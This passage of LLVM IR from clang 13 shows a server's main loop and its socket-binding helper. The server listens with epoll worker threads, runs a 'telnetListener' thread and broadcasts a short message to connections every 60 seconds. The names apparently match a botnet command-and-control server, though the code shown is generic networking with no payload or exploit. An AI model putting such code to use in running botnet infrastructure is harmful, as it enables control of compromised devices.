  %30 = call i32 @create_and_bind(i8* %29)
  store volatile i32 %30, i32* @listenFD, align 4
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %34

33:                                               ; preds = %21
  call void @abort() #9
  unreachable

34:                                               ; preds = %21
  %35 = load volatile i32, i32* @listenFD, align 4
  %36 = call i32 @make_socket_non_blocking(i32 %35)
  store i32 %36, i32* %6, align 4
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %34
  call void @abort() #9
  unreachable

40:                                               ; preds = %34
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @listen(i32 %41, i32 4096) #8
  store i32 %42, i32* %6, align 4
  %43 = load i32, i32* %6, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i64 0, i64 0))
  call void @abort() #9
  unreachable

46:                                               ; preds = %40
  %47 = call i32 @epoll_create1(i32 0) #8
  store volatile i32 %47, i32* @epollFD, align 4
  %48 = load volatile i32, i32* @epollFD, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.40, i64 0, i64 0))
  call void @abort() #9
  unreachable

51:                                               ; preds = %46
  %52 = load volatile i32, i32* @listenFD, align 4
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %54 = bitcast %union.epoll_data* %53 to i32*
  store i32 %52, i32* %54, align 1
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 -2147483647, i32* %55, align 1
  %56 = load volatile i32, i32* @epollFD, align 4
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = call i32 @epoll_ctl(i32 %56, i32 1, i32 %57, %struct.epoll_event* %8) #8
  store i32 %58, i32* %6, align 4
  %59 = load i32, i32* %6, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

61:                                               ; preds = %51
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  call void @abort() #9
  unreachable

62:                                               ; preds = %51
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 2
  %65 = zext i32 %64 to i64
  %66 = call i8* @llvm.stacksave()
  store i8* %66, i8** %9, align 8
  %67 = alloca i64, i64 %65, align 16
  store i64 %65, i64* %10, align 8
  br label %68

68:                                               ; preds = %72, %62
  %69 = load i32, i32* %7, align 4
  %70 = add nsw i32 %69, -1
  store i32 %70, i32* %7, align 4
  %71 = icmp ne i32 %69, 0
  br i1 %71, label %72, label %78

72:                                               ; preds = %68
  %73 = load i32, i32* %7, align 4
  %74 = add nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i64, i64* %67, i64 %75
  %77 = call i32 @pthread_create(i64* %76, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #8
  br label %68, !llvm.loop !22

78:                                               ; preds = %68
  %79 = getelementptr inbounds i64, i64* %67, i64 0
  %80 = call i32 @pthread_create(i64* %79, %union.pthread_attr_t* null, i8* (i8*)* @telnetListener, i8* null) #8
  br label %81

81:                                               ; preds = %82, %78
  br label %82

82:                                               ; preds = %81
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1)
  %83 = call i32 @sleep(i32 60)
  br label %81
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.42, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #8
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #8
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.43, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #8
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !23

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.44, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #8
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #1

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #3

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #3

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly willreturn }
attributes #11 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
